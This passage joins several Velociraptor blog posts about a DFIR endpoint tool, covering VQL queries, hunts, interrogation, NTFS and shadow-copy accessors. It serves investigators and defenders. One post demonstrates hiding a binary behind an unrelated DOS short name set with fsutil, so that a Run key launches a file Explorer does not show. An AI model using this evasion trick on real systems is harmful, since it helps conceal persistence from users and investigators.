server and processed while the query is still executing on the client.

Consider the VFSListDirectoryflow was issued with a glob of /\*\*10
(i.e. refresh the entire VFS view from the root directory, recursively
into a depth of 10 directories). The VQL query executed was:

``` {.sourceCode .sql}
SELECT FullPath AS _FullPath,
    Name, Size, Mode,
    timestamp(epoch=Sys.Mtim.Sec) AS mtime,
    timestamp(epoch=Sys.Atim.Sec) AS atime,
    timestamp(epoch=Sys.Ctim.Sec) AS ctime
FROM glob(globs='/**10')
```

The query was issued to a Velociraptor client running on a Chromebook.
This particular system has approximately 500k files in its root
filesystem, and so the response consists of 500k rows. However, as the
query executes, the response is split into multiple parts, each being
10k rows, and uploaded (each part is about 3mb in total).

![image](image3.png)

Total execution time for this query is about 4 minutes and consists of
about 50 parts (around 2.5mb each). It is still an expensive query, but
depending on the urgency of the case, it may well be warranted.

It is very convenient to just take a snapshot of the entire filesystem,
especially when the client is offline. We can issue the flow and then
when the client comes back online we can review all the files.

File uploads
============

The VFS view is just a local cache in the data store of what is really
going on the client. While we can see the file in each directory we cant
transfer all the file content. Velociraptor represents downloaded files
differently from just listed files. Files with the floppy disk next to
them represent files that we have a local cache for. We can view the
Hexview or just download them.

You can always initiate a download of a VFS file by selecting the
Download tab. Unlike GRR, Velociraptor does not keep previous versions
of files - a re-download will overwrite the previous file.

---END OF FILE---

======
FILE: /content/blog/html/2018/08/10/design_differences_between_velociraptor_and_grr/_index.md
======
---
date: 2018-08-10T04:10:06Z
description:  |
  One of the main motivators for developing Velociraptor is the
  opportunity to try different approaches than GRR. Velociraptor has a
  number of fundamental design differences in contrast with the GRR
  design which improve overall performance and scalability.  We tried to
  keep it light weight cutting out the features we think we did not need
  and leaving behind a fast, lean and mean raptor!

title: Design differences between Velociraptor and GRR
linktitle: 20180810 Design differences between Velociraptor and GRR
categories: ["Blog"]
---

### Velociraptor Clients run full VQL queries

GRR\'s design started off with the assumption that the client should be
minimalist and only support a few simple primitives (such as
ListDirectory, ListProcesses etc). The intention was that most of the
processing would be executed on the server inside a \"Flow\". The main
motivation for this design choice was the observation that it is
difficult to upgrade the client in practice, and so with a minimal
client, it would be possible to develop more sophisticated Flows, server
side, without needing to update the clients.

After running GRR for a while we noticed that this design choice was
problematic, since it leads to many client round trips. For example the
FileFinder flow searches the client\'s filesystem for files by name,
date etc. GRR\'s original file finder uses a complex algorithm to issue
ListDirectory requests to the client, receive their responses, filter
and recurse into directories by communicating with the client again.
This leads to many round trips and has a huge performance hit on both
the server and client.

Velociraptor does away with all that by including rich client side
functionality (through VQL plugins), and implementing VQL queries to
perform the filtering. This means that in reality, Velociraptor has very
few client round trips, generally just one: The VQL query is sent to the
client, and the result is received by the server.

Some types of analysis require the results of one operation to feed into
the next operation. For example, suppose we wanted to upload all
executables that are run from a temp directory. This requires listing
all processes, then filtering the ones running from a temp directory,
and finally uploading those to the server.

GRR\'s model requires writing a new flow for this - the flow first
issues a ListProcesses request to the client, then receives all
processes where the filtering happens on the server. The server then
issues upload commands for each matching process. Performing this
analysis requires writing and deploying new code making it difficult to
adapt rapidly to changing threats.

With Velociraptor one simply issues the following VQL query:

``` {.sourceCode .sql}
LET files = SELECT Exe, Cmdline, Username FROM pslist()
        WHERE Exe =~ '(?i)temp'
SELECT Exe, Cmdline, Username, upload(file=Exe) AS Upload
  FROM files
```

VQL avoids this round trip completely, since VQL queries can be nested
and chained together. Therefore one simply runs the first query (list
all processes running from temp directory), and sends the results to the
next query (download the matching files) inside the same VQL client
request. It is rare that Velociraptor flows run multiple client round
trips, resulting in lightweight and fast completing flows.

Worker and Database queues.
===========================

The GRR model of long running flows with multiple client/server
interactions required more complex design. Since client messages can be
delivered in multiple POST requests, and a single request can result in
multiple responses, GRR must queue responses somewhere until they are
all ready to be processed. Otherwise writing GRR flows would be
difficult because one would need to account for incomplete responses.

GRR uses a complex request/response protocol to ensure messages are
delivered in order, reminiscent of the TCP stack\'s packet reassembling
algorithms.

Consider the simple request \"ListDirectory\". The client request may
elicit thousands of responses (one for each file) and may span multiple
POST operations. The GRR frontend queues all the responses in the
database until it receives a STATUS response, and then fetches once. So even
if the client sends the responses over multiple packets, the flow only
sees a single list. When a status message is seen by the frontend, it
notifies the worker via a worker queue, which collects all responses,
orders them by response ID and delivers to the flow object.

This design is necessary if flows are long lived and need to handle
thousands of responses for each request. However in practice this design
has a couple of serious problems:

1.  The frontend receives responses and just writes them into the
    database in special queue rows, then the worker reads them from the
    queue rows for processing (after which they must be deleted from the
    database). This leads to a lot of unnecessary read/write/delete
    cycles and extra load on the database.
2.  The worker queue rows are used by all clients and all flows. This
    leads to a lot of database contention on these rows. Extra care must
    be taken to ensure no race conditions, through careful management of
    database locks. Extra locks slow down the database and typically for
    a busy system queue contention is a huge bottleneck.

This is easy to observe in practice on a busy GRR system (i.e. one that
is running many flows or hunts) by simply looking at the output from
top. Typically the mysql process uses as much CPU or more than the
frontends and workers combined. This indicates a huge load on the
database and limits scalability. Increasing the number of frontends only
helps marginally because the database throughput becomes the limiting
factor. In fact, increasing the number of workers can deteriorate
performance because workers poll on their queues while holding locks
thereby increasing row lock contention even more.

Velociraptor takes a different approach. Since Velociraptor flows are
very simple and typically only consist of a few request/response cycles,
the server does not bother to reorder replies that come in different
packets. Therefore there is no need to temporarily store or queue
responses. Responses can be delivered to the flow as soon as they are
received - and flows typically just write them to the database in their
final storage location.

Therefore Velociraptor does not have a dedicated worker, nor does it
have database queues. The frontend itself runs the flows directly on the
received packets while serving the client\'s poll request. This
completely eliminates the need for worker queues and their associated
database contention issues. Removing the worker queues eliminates a
significant amount of very complex and delicate code. Additionally,
since the responses are not written/read to the queue, the total load on
the database is significantly reduced. (In fact because database lock
contention is so low, Velociraptor can work very well with plain files
through the FileBaseDataStore, even at large scale!)

The following illustration demonstrates how significant this is for the
simple example of a ListDirectory request of a directory with 1000 files
in it (e.g. the c:windows directory). The equivalent VQL is
select \* from glob(paths=\'c:/windows/\*\') and only produces a single
response packet containing all the files in the one table, whereas
GRR\'s ListDirectory client action produces a single response for each
file, which is then queued and stored independently in the database.

The overall effect, in the GRR case, is that 2000 database rows are
created, of which 1000 rows are immediately deleted - a significant
database load. Compare this with the Velociraptor equivalent flow -the
VQL request is sent to the client once, then the response is returned to
the frontend in a single POST operation. Since Velociraptor does not
have a separate worker and does not need to queue messages to it, the
frontend immediately runs the flow which just writes the result into a
single DB row - total database operations: 1 row written.

![](image1.png)

Eliminating the need for a separate worker process also simplifies
deployment significantly. GRR needs to deploy separate frontends and
worker processes, and it is often difficult to know which one to scale
up. Scaling up the frontend will allow more packets to be received but
actually increases the load on the database. Not having sufficient
workers will leave many requests on the queue for a long time and will
prolong the execution of the flow since a worker must run the flow in
order to issue the next set of requests. This leads to flows which take
many hours to complete and even hung flows (if the client reboots or
disconnects before the flow finished).

Velociraptor deployment is much simpler - there is only a single binary
and it can be scaled and load balanced as needed. Since database load is
much lower, the frontend can handle a much larger load. Furthermore, the
flows typically execute in very short time (since there is only one
round trip). The overall result is that flow throughput is much
increased and resource usage is reduced.

---END OF FILE---

======
FILE: /content/blog/html/2018/08/10/introducing_velociraptor/_index.md
======
---
date: 2018-08-09T04:10:06Z
description:  |
  At Velocidex we have been running open source endpoint monitoring
  tools for our clients in order to detect and respond to incidents.
  This post introduces a new tool called Velociraptor - an advanced
  DFIR tool.

title:  Introducing Velociraptor
linktitle: 20180809 Introducing Velociraptor
categories: ["Blog"]
---

Hunting and responding like a raptor!
=====================================

At Velocidex we have been running open source endpoint monitoring tools
for our clients in order to detect and respond to incidents. One of our
favorite tools is GRR, developed by Google internally and then released
as open source. GRR is a very powerful tool, with a polished UI and good
documentation.

Unfortunately the open source version released by Google suffers from
some shortcomings and so we have decided to develop a new project, built
on the shoulders of giants called Velociraptor.

These are Velociraptor\'s design goals:

 -   **Focus on data collection.** Velociraptor\'s primary use case is to
     collect data and export it to other systems. Velociraptor does no
     analysis itself and therefore has no need for a complex data
     model.
 -   **Flexibility**. Velociraptor can adapt easily to new requirements
     without needing to redeploy either clients or servers. Using VQL
     (Velocidex Query Language) provides flexibility in the type and
     number of queries that are used to rapidly adapt to changing
     requirements. VQL allows us to collect just the information needed
     and no more in an adaptive way.
 -   **Remove abstractions**. Velociraptor aims to be as simple to
     understand as possible. The default data store simply stores files
     in the file system which may be easily inspected by the user. No
     special tooling is required to script or manage Velociraptor.
     Reduce demand on the data store. Rather than increase the data
     store requirements, we want to simplify the design to the point
     that requirements on the data store are so low, one can run a
     medium to large sized deployment with very few resources (down to
     perhaps a single server machine). In fact the default data store
     does not even use a database, but simply uses flat files.
 -   **Simplify everything!** Velociraptor aims to be very simple to run
     and administer. We remove a lot of the GRR functionality that we
     don't find we use often. Velociraptor ships as a single, statically
     linked executable which can perform all actions necessary for
     deployers.

In short we really wanted something like this:

![](image5.png)


Velociraptor is a new end point monitoring and IR
tool built upon GRR\'s groundwork and experience. To be clear, we reused
some of GRR\'s code and some design elements, but Velociraptor is a new
project and is largely a rewrite of GRR\'s codebase. Like GRR,
Velociraptor is released under an open source license and is a community
project hosted on <https://gitlab.com/velocidex/velociraptor>.

It is still very early days and we would love to receive feedback and
suggestions. This is the first technology preview release and we hope to
make a more stable and comprehensive release in the coming months. As
Velociraptor becomes more battle tested we hope the codebase will
stabilize.

The near term roadmap is:

-   Improve support for more operating systems. Especially Windows:
-   Registry based VQL plugins.
-   NTFS support for raw disk access.
-   Memory scanning and rudimentary Memory analysis
-   Design a more efficient client/server communication mechanism - long
    polling is problematic since clients only poll infrequently (e.g.
    every 10 minutes). We want to be able to control all clients
    quickly.
-   Develop a library of VQL expressions which may be reusable. This
    should be similar to GRR\'s idea of Artifacts but be more geared
    towards VQL.

Please play with it and send feedback to
<velociraptor-discuss@googlegroups.com>

![](image11.png)

---END OF FILE---

======
FILE: /content/blog/html/2018/08/10/interrogation_make_the_endpoint_tell_us_what_it_knows/_index.md
======
---
date: 2018-08-10T04:10:06Z
description:  |
  Interrogation is the process of learning general information about the
  endpoint we are monitoring. Each endpoint is automatically
  interrogated when it first joins the Velociraptor server, and the GUI
  shows this general information about each client.

title: Interrogation - Make the endpoint tell us what it knows!
categories: ["Blog"]
---


When writing Velociraptor we decided to keep things very simple - we did
away with a lot of the information gathered during interrogate in favor
of a much simpler data model.

Data Modelling - The Interrogate Flow
=====================================

GRR maintains an elaborate model of client data. For example, GRR
collects and maintains a list of clients\' network interfaces, users,
user\'s home directory etc. This information is maintained in elaborate
protobufs and stored in the database in many rows.

While some of this information is needed for client searching, GRR
maintains vastly more information than necessary in this data model. The
client data model is built during the interrogate phase (A periodic flow
run on the clients to refresh server side data).

Maintaining such a complex data model results in a very rigid design.
For example, if a user wanted to collect more information from clients
they would need to modify protobufs, update the interrogate flow,
recompile the code and redeploy. These modifications are also very
invasive as once code has been heavily modified, there is an overhead of
keeping these modifications in sync with newer upstream versions.

Velociraptor also maintains client information via its Interrogate flow.
However, Velociraptor\'s interrogate flow simply issues a series of VQL
queries, and these responses are stored directly in the database with
minimal interpretation. Indexes are maintained for some information
which users should be able to search on, but there is no attempt to
build or maintain a client data model at all (You can see details of the
model described below in the FileBaseDataStore post).

The advantage of this approach is that users can simply add extra VQL
queries to the interrogate phase to collect more tailored site specific
information. This does not require compiling of any code or redeploying
the server. The following example illustrates the power of this
technique.

Customizing the Interrogate flow.
=================================

Normally Velociraptor collects minimal information from the client upon
interrogation (i.e. when the client first enrols or when interrogated
periodically). However it is very easy to customize this collection
depending on local site requirements. In this section we work through a
step by step example of extending the Velociraptor interrogate flow.

Suppose that in our deployment we wanted to check if a machine is able
to be logged into remotely. For a Linux machine we want to see all
authorized\_keys files on every machine that enrolls. Collecting this
information allows us to quickly see which machines a compromised user
account could spread to.

We know we need to issue a VQL query but we are not 100% sure which one.
Luckily we can use Velociraptor itself to run the query locally using
the syntax \"velociraptor query \<query\>\".

Start with a simple glob query to find all authorized\_keys files:

``` {.sourceCode .sql}
SELECT FullPath from glob(globs="/home/*/.ssh/authorized_keys")
```

Suppose we now want to actually grab a copy of all files so we can
archive them on the server This will keep a record of the authorized
keys on the server for each Interrogate flow. If we run the flow
periodically we will end up with a time based evolution of the
authorized keys files on each host. Pretty handy!

``` {.sourceCode .sql}
SELECT FullPath,
   timestamp(epoch=Sys.Mtim.Sec) as Mtime,
   upload(file=FullPath) as Upload
FROM glob(globs="/home/*/.ssh/authorized_keys")
```

We can run the query locally using the Velociraptor tool:

``` {.sourceCode .bash}
mic@localhost:/tmp> velociraptor query "select FullPath, \
   timestamp(epoch=Sys.Mtim.Sec) as Mtime, \
   upload(file=FullPath) as Upload \
   FROM glob(globs=['/home/*/.ssh/authorized_keys'])"

velociraptor: Uploaded home/mic/.ssh/authorized_keys (395 bytes)
[
 {
  "FullPath": "/home/mic/.ssh/authorized_keys",
  "Mtime": "2018-08-03T18:20:19+10:00",
  "Upload": {
    "Path": "home/mic/.ssh/authorized_keys",
    "Size": 395
 }
}
]
```

Velociraptor\'s query command enables us to run the query directly on
the local host and observe the results. When the same query is issued to
the Velociraptor client, the same result will be generated and sent to
the server. This enables us to interactively develop and test our
queries without needing to run a full client/server.

Note the upload() VQL function which causes the file to be uploaded to
the server. (When run locally the file will be copied to the upload
directory as can be seen by the upload confirmation message), but when
run within the Velociraptor client, the file will be uploaded to the
server and stored within the flow.

We can now add the query to all Interrogate flows that will be run from
now on. We simply add it to the configuration file under the
Interrogate.additional\_queries key:

``` {.sourceCode .yaml}
Interrogate.additional_queries:
 Query:
   - Name: Authorized Keys
     VQL: >
       select FullPath, timestamp(epoch=Mtime.Sec) as Mtime,
       upload(file=FullPath) as Upload
       from glob(globs='/home/*/.ssh/authorized_keys')
```

From now on the additional query will be recorded for all clients. The
GUI shows it in the client information page:

![](image6.png)

---END OF FILE---

======
FILE: /content/blog/html/2018/08/10/hunting_what_velociraptors_do_best/_index.md
======
---
date: 2018-08-10T04:10:06Z
description:  |
  A hunt is a feature where a single flow may be run on multiple clients
  at the same time. Typically a hunt looks for a particular indicator of
  compromise across the entire deployment, or maybe collect the same
  files from every deployed agent. By their nature, hunts cause multiple
  flows to run simultaneously and so this creates a large contention of
  shared state.

title: Hunting - What Velociraptors do best!
categories: ["Blog"]
---


Velociraptor has completely redesigned the way that hunts are
implemented in order to avoid database locking and increase hunt
processing efficiency.

Now we hunt like this:

![](image4.jpg)

How are hunts scheduled?
========================

GRR allows hunts to be scheduled by a few client properties such as OS
type, label, users etc. This works because GRR has an extensive data
model of endpoint properties. However, this requires that the data model
be refreshed periodically to be kept accurate. For example, to run a
hunt of all machines with a suspected compromised user account we can
schedule the run on all machines where the user has logged in, but
because GRR uses its data model to decide if a machine should be issued
the hunt, the data model may be out of date and GRR will not schedule
the hunt on machines which have only recently been logged into. For this
reason we typically run the Interrogate hunt very frequently causing a
lot of extra load on the system and clients hoping to minimize the time
window where the data model is out of date with reality.

Velociraptor\'s approach is different - since Velociraptor does not
really maintain a data model server side, we check the client\'s
information for every hunt, before we even decide if the hunt should be
scheduled for this client. This is done by issuing a VQL query to the
client.

Sometimes we don\'t necessarily want the client to know exactly why we
are scheduling the hunt (e.g. in the compromised user account case we
don\'t want to advertise the exact username we are looking for). In
these cases we run another VQL query on the server side.

So hunt selection is managed by two different VQL queries - a client
side one and a server side on.

The default client side VQL queries simply collects the usual facts like
OS version, Username etc, while the server side query filters the
results with more specific conditions. This approach does not reveal to
the client the hunt\'s condition:

``` {.sourceCode .sql}
Client side VQL:
    SELECT OS, Architecture, Fqdn, Platform,
      config.Client_labels AS Labels
      FROM info()

Server side VQL:
    SELECT * from rows
      WHERE Fqdn =~ '(?i)myhostname.+' AND 'MY_LABEL' IN Labels
```

The hunt\'s life cycle
======================

When the hunt is started, the server updates its in-memory list of
active hunts managed by the Foreman. Clients then poll the foreman for
new hunts they should participate in. Clients remember the last hunt
they participated in and so they present this hunt\'s timestamp to the
foreman. If a new hunt is available, the foreman can immediately launch
the `CheckHuntCondition` flow on the client.

{{% notice note %}}

The clients themselves are actively keeping track of the hunts they
participated in. This avoids the server having to check the client\'s DB
record.

{{% /notice %}}

The `CheckHuntCondition` flow issues the client side VQL queries and then
runs the server side query on the results. If the query matches (i.e.
the hunt should be scheduled for this client), the client\'s record is
written into the hunt\'s \"pending\" queue.

The hunt manager
================

Each hunt specifies its own client recruitment rate (i.e. how many
clients will be started per minute). The hunt manager is a component
which periodically reads all hunts and schedules flows for these hunts
if the hunts\' client rate allows for more clients to be scheduled. It
does this by moving clients from the pending queue to the running queue
and starting respective flows for them.

Once each of those flows completes, the record is moved from the running
queue to the completed queue or the results queue if the flow produced
any results. We can observe how many clients exist in each queue using
the GUI.

![](image2.png)

The flows that hunts launch arn the client. However, when they complete,
a small record is made in the hunts\'s results queue pointing to the
flow. It is therefore possible to retrieve all results from the hunt
from all client\'s. For example, the GUI allows downloading a zip file
of all the results and files uploaded:

![](image7.png)

Since hunts invoke regular flows, and Velociraptor flows are much
lighter than GRR\'s flows, hunts are much cheaper to run in terms of
resources consumed.

---END OF FILE---

======
FILE: /content/blog/html/2018/09/30/velorciraptor_s_filesystem_s_accessors/_index.md
======
---
date: 2018-09-30T04:10:06Z
description: |
  The latest release of Velociraptor introduces the ability to access
  raw NTFS volumes, allowing users to read files which are normally
  locked by the operating system such as registry hives, pagefile and
  other locked files.
title: Velociraptor's filesystem's accessors
categories: ["Blog"]
---


In addition, Velociraptor can now also read [Volume Shadow
Copy](https://docs.microsoft.com/en-us/windows/desktop/vss/volume-shadow-copy-service-portal)
snapshots. The gives a kind of time-machine ability to allow the
investigator to look through the drive content at a previous point in
the past.

This blog post introduces the new features and describe how
Velociraptor\'s filesystem accessors work to provide data from multiple
sources to VQL queries.

We have previously seen that Velociraptor can list and download files
from the client\'s filesystem, as well as registry keys and values. The
client\'s filesystem is made available to VQL plugins such as glob()
allowing many Artifacts to be written that work on files, registry keys
and raw NTFS volumes.

While Velociraptor is a great remote response tool, everything that it
can do remotely, it can also do locally using a command line interface.
This gives the user an opportunity to interactively test their VQL
queries while writing artifacts.

The latest release adds a couple of convenient command line options
which allow the user to interact with the filesystem accessors. For
example, to list the files in a directory we can use the \"velociraptor
fs ls\" command:

``` {.sourceCode .console}
F:\>velociraptor.exe fs ls
+------+------+------------+---------------------------+---------------------------------+
| Name | Size |    Mode    |           mtime           |              Data               |
+------+------+------------+---------------------------+---------------------------------+
| C:   |    0 | d--------- | 1969-12-31T16:00:00-08:00 | Description: Local Fixed Disk   |
|      |      |            |                           | DeviceID: C:                    |
|      |      |            |                           | FreeSpace: 12686422016          |
|      |      |            |                           | Size: 33833349120               |
|      |      |            |                           | SystemName: DESKTOP-IOME2K5     |
|      |      |            |                           | VolumeName:                     |
|      |      |            |                           | VolumeSerialNumber: 9459F443    |
| D:   |    0 | d--------- | 1969-12-31T16:00:00-08:00 | Description: CD-ROM Disc        |
|      |      |            |                           | DeviceID: D:                    |
|      |      |            |                           | FreeSpace: 0                    |
|      |      |            |                           | Size: 57970688                  |
|      |      |            |                           | SystemName: DESKTOP-IOME2K5     |
|      |      |            |                           | VolumeName: VBox_GAs_5.2.11     |
|      |      |            |                           | VolumeSerialNumber: A993F576    |
+------+------+------------+---------------------------+---------------------------------+
SELECT Name, Size, Mode.String AS Mode, timestamp(epoch=Mtime.Sec) AS mtime,
   Data FROM glob(globs=path, accessor=accessor)
```

The \"fs ls\" command instructs Velociraptor to list directories using
its internal filesystem accessors. By default it will use the \"file\"
accessor - which simply uses the usual Win32 api filesystem calls (i.e.
`CreateFile`, `FindFirstFile` etc).

On windows, the file accessor lists the drive letters at the root of the
filesystem, then allows subdirectories to be listed under each letter.
The above output shows some metadata for each drive letter (like its
size etc) and below the table we can see the VQL query that was used to
generate the table. To be clear, the \"fs ls\" command is simply a
shortcut for producing a VQL query that ultimately uses the filesystem
accessor in the glob() VQL plugin. Therefore, we can enter any glob
expression to find files:

``` {.sourceCode .console}
F:\>velociraptor.exe fs ls -v "c:\program files\**\*.exe"
+--------------------------------+----------+------------+---------------------------+------+
|            FullPath            |   Size   |    Mode    |           mtime           | Data |
+--------------------------------+----------+------------+---------------------------+------+
| C:\Program Files\Windows Defen |  4737448 | -rw-rw-rw- | 2018-07-14T17:56:49-07:00 |      |
| der Advanced Threat Protection |          |            |                           |      |
| \MsSense.exe                   |          |            |                           |      |
| C:\Program Files\Windows Defen |   791384 | -rw-rw-rw- | 2018-07-14T17:56:43-07:00 |      |
| der Advanced Threat Protection |          |            |                           |      |
| \SenseCncProxy.exe             |          |            |                           |      |
| C:\Program Files\Windows Defen |  3832016 | -rw-rw-rw- | 2018-07-14T17:56:50-07:00 |      |
| der Advanced Threat Protection |          |            |                           |      |
| \SenseIR.exe                   |          |            |                           |      |
| C:\Program Files\Windows Defen |  2147192 | -rw-rw-rw- | 2018-07-14T18:05:00-07:00 |      |
| der Advanced Threat Protection |          |            |                           |      |
| \SenseSampleUploader.exe       |          |            |                           |      |
........
+--------------------------------+----------+------------+---------------------------+------+
SELECT FullPath, Size, Mode.String AS Mode, timestamp(epoch=Mtime.Sec) AS mtime, Data FROM
glob(globs=path, accessor=accessor)
```

When using the registry filesystem accessor, the registry appears like a
filesystem, allowing us to run glob expressions against registry keys
and values (Note that the registry accessor provides the value in the
metadata):

``` {.sourceCode .console}
F:\>velociraptor.exe fs --accessor reg ls "HKEY_USERS\*\Software\Microsoft\Windows\CurrentVersion\{Run,RunOnce}\*"
+---------------+------+------------+---------------------------+---------------------------------+
|     Name      | Size |    Mode    |           mtime           |             Data                |
+---------------+------+------------+---------------------------+---------------------------------+
| OneDriveSetup |  104 | -rwxr-xr-x | 2018-09-03T02:48:53-07:00 | type: SZ                        |
|               |      |            |                           | value: C:\Windows\SysWOW64\     |
|               |      |            |                           | OneDriveSetup.exe /thfirstsetup |
| OneDriveSetup |  104 | -rwxr-xr-x | 2018-09-03T02:48:47-07:00 | type: SZ                        |
|               |      |            |                           | value:   C:\Windows\SysWOW64\   |
|               |      |            |                           | OneDriveSetup.exe /thfirstsetup |
+---------------+------+------------+---------------------------+---------------------------------+
SELECT Name, Size, Mode.String AS Mode, timestamp(epoch=Mtime.Sec) AS mtime,
Data FROM glob(globs=path, accessor=accessor)
```

Finally, the NTFS accessor can access files by parsing the NTFS
filesystem directly. At the top level, the accessor shows all NTFS
formatted partitions. These include regular drives as well as Volume
Shadow Copies:

``` {.sourceCode .console}
F:\>velociraptor.exe fs --accessor ntfs ls
+--------------------------------+------+------------+---------------------------------------------------------+
|              Name              | Size |    Mode    |                             Data                        |
+--------------------------------+------+------------+---------------------------------------------------------+
| \\.\C:                         |    0 | d--------- | Description: Local Fixed Disk                           |
|                                |      |            | DeviceID: C:                                            |
|                                |      |            | FreeSpace: 11802157056                                  |
|                                |      |            | Size: 33833349120                                       |
|                                |      |            | SystemName: DESKTOP-IOME2K5                             |
|                                |      |            | VolumeName:                                             |
|                                |      |            | VolumeSerialNumber: 9459F443                            |
| \\?\GLOBALROOT\Device\Harddisk |    0 | d--------- | DeviceObject: \\?\GLOBALROOT\Device\                    |
|                                |      |            |             HarddiskVolumeShadowCopy1                   |
| VolumeShadowCopy1              |      |            | ID: {CAF25144-8B70-4F9E-B4A9-5CC702281FA1}              |
|                                |      |            | InstallDate: 20180926154712.490617-420                  |
|                                |      |            | OriginatingMachine: DESKTOP-IOME2K5                     |
|                                |      |            | VolumeName: \\?\Volume{3dc4b590-0000-000-501f00000000}\ |
| \\?\GLOBALROOT\Device\Harddisk |    0 | d--------- | DeviceObject: \\?\GLOBALROOT\Device\                    |
|                                |      |            |            HarddiskVolumeShadowCopy2                    |
| VolumeShadowCopy2              |      |            | ID: {E48BFDD7-7D1D-40AE-918C-36FCBB009941}              |
|                                |      |            | InstallDate: 20180927174025.893104-420                  |
|                                |      |            | OriginatingMachine: DESKTOP-IOME2K5                     |
|                                |      |            | VolumeName: \\?\Volume{3dc4b590-0000-000-501f00000000}\ |
+--------------------------------+------+------------+---------------------------------------------------------+
SELECT Name, Size, Mode.String AS Mode, timestamp(epoch=Mtime.Sec) AS mtime,, Data FROM glob(globs=path, accessor=accessor) WHERE Sys.name_type != 'DOS'
```

The above example shows two volume shadow copies that Windows has taken
on two different dates (highlighted above). We can browse these
snapshots just like they were another drive (We can also apply any glob
expressions to this path):

``` {.sourceCode .console}
F:\>velociraptor.exe fs --accessor ntfs ls "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
Users\test\*.exe"
+------------------+----------+------------+---------------------------+------------------+
|       Name       |   Size   |    Mode    |           mtime           |       Data       |
+------------------+----------+------------+---------------------------+------------------+
| velociraptor.exe | 12521472 | -rwxr-xr-x | 2018-08-19T23:37:01-07:00 | mft: 39504-128-0 |
|                  |          |            |                           | name_type: Win32 |
| winpmem.exe      |  3619260 | -rwxr-xr-x | 2017-12-28T21:17:50-08:00 | mft: 39063-128-1 |
|                  |          |            |                           | name_type: POSIX |
+------------------+----------+------------+---------------------------+------------------+
SELECT Name, Size, Mode.String AS Mode, timestamp(epoch=Mtime.Sec) AS mtime, Data FROM
glob(globs=path, accessor=accessor) WHERE Sys.name_type != 'DOS'
```

Volume shadow copies are like a time machine - they can reveal data that
was stored on the drive days or weeks prior to the time we inspected it
which makes them very useful for some investigations.

Using filesystem accessors remotely - The Velociraptor VFS
==========================================================

The above description shows how Velociraptor\'s command line interface
can be used to interact with the various filesystem accessors. This is
important for writing and collecting artifacts for triage and general
system state exploration.

However, how do filesystem accessors appear in the Velociraptor GUI?

![image](vfs1.png)

The nice thing about Velociraptor\'s GUI is that it is just a way to
present the same information that the \"fs ls\" command is getting by
using the same VQL queries. Therefore the view is very familiar:

1.  The top level of the Velociraptor VFS represents all the filesystem
    accessors implemented in the client.
2.  Each of these accessors shows its own view:
    1.  The file accessor uses the OS APIs to list files and
        directories. Its top level is a list of mounted drives (which
        may be CDROM\'s or even network shares).
    2.  The NTFS accessor shows all NTFS volumes accessible, including
        local drives and Volume Shadow Copies.
    3.  The registry accessor uses Win32 APIs to access the registry and
        shows at the top level a list of all system hives currently
        attached.
3.  For each file listed, the accessor also includes a Data attribute.
    This contains accessor specific metadata about the file (for example
    the MFT entry).

In the below screenshot we can see how the user may navigate into the
Volume Shadow Copy and retrieve files from it:

![image](vfs2.png)

A note about filenames.
=======================

NTFS can have several different names to the same file. Typically, a
short DOS 8.3 style filename (e.g. `PROGRA~1`), as well as a Win32 long
filename (e.g. Program Files). You can see the short name for a file
using the API GetShortPathName() (or the command `dir /x`), but a program
needs to deliberately ask for it. Most programs do not explicitly
collect or show the short filename of a file.

This can cause problems for DFIR applications. For example, Imagine we
discovered a Run key to C:\\\\Users\\\\test\\\\runme.exe. If we only
considered the long filename (as for example returned by the Win32API
FindFile() or the output of the `dir` command), then we would assume the
file has been removed and the run key is not active. In reality however,
the file may be called \"This is some long filename.exe\" with a DOS
name of \"runme.exe\". Explorer (and most tools) will only show the long
filename by default, but the runkey will still execute by referring to
the DOS filename!

Usually the short filename is some variation of the long filename with a
\~1 or \~2 at the end. In reality it can be anything. In the snippet
below, I am setting the short filename for the velociraptor.exe binary
to be something completely unrelated, then I am running the binary using
the unrelated filename:

``` {.sourceCode .console}
C:\Users\test>fsutil file setshortname velociraptor.exe runme.exe
C:\Users\test>dir /x *.exe
 Volume in drive C has no label.
 Volume Serial Number is 9459-F443

 Directory of C:\Users\test

08/19/2018  11:37 PM        12,521,472 RUNME.EXE    velociraptor.exe
               2 File(s)     16,140,732 bytes
               0 Dir(s)  11,783,704,576 bytes free
C:\Users\test>runme.exe -h
usage: velociraptor [<flags>] <command> [<args> ...]

An advanced incident response and monitoring agent.
```

You can see that Windows explorer shows no trace of the runme.exe file
since it only displays the Win32 long file name:

![image](vfs3.png)

It is important for DFIR investigators to be aware of this and test your
tools! You can see that sysinternals\' autoruns program won\'t have any
of these shenanigans when I added a runkey to \"runme.exe\". It shows
the real filename velociraptor.exe even though the runkey indicates
runme.exe:

![image](vfs4.png)

Velociraptor treats a file\'s DOS name and Win32 Name as distinct
entries in the NTFS directory listing. This allows us to find any
references to the file by it\'s DOS name as well as its Win32 name.

Conclusions
===========

As Velociraptor gains more functionality, we envision more filesystem
accessors to become available. The nice thing about these accessors is
that they just slot in to the rest of the VQL plugins. By providing a
new accessor, we are able to glob, hash, yara scan etc the new
abstraction. For example, to yara scan a registry key one simply calls
the VQL plugin yara with an accessor of reg: yara(rules=myRules,
files=my\_reg\_keys, accessor=\"reg\")

---END OF FILE---

======
FILE: /content/blog/html/2018/09/03/velociraptor_walk_through_and_demo.md
======
---
date: 2018-09-03T04:10:06Z
description: "A screencast of the latest Velociraptor"
title: "Velociraptor walk through and demo"
categories: ["Blog"]
---

I just uploaded a screencast of the latest Velociraptor - check it out
and play with it, and please provide feedback at
<velociraptor-discuss@googlegroups.com>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; height: auto;">
<iframe width="560" height="315" src="https://www.youtube.com/embed/ecP-TeUvSEY"
   frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div>

---END OF FILE---

======
FILE: /content/blog/html/2018/09/03/velociraptor_s_client_communications/_index.md
======
---
date: 2019-09-03T04:10:06Z
description: |
 In the latest point release of the Velociraptor IR tool (0.2.3) we
 have improved upon GRR's client communications protocol to deliver a
 fast and efficient, yet extremely responsive client
 communication. This post explains the design of the client
 communication and how it solves the problems with the old GRR's client
 communication.

title: Velociraptor's client communications
categories: ["Blog"]
---

### How does the GRR client communicate?

The GRR client protocol is depicted below.

![](comms1.png)

Due to network realities such as NAT, firewalls etc, it is not possible
to directly connect to the client, so GRR relies on the client
connecting to the server in order to communicate with it.

The GRR client makes periodic POST requests to the server to both send
replies and receive new instructions. Since POST requests are very short
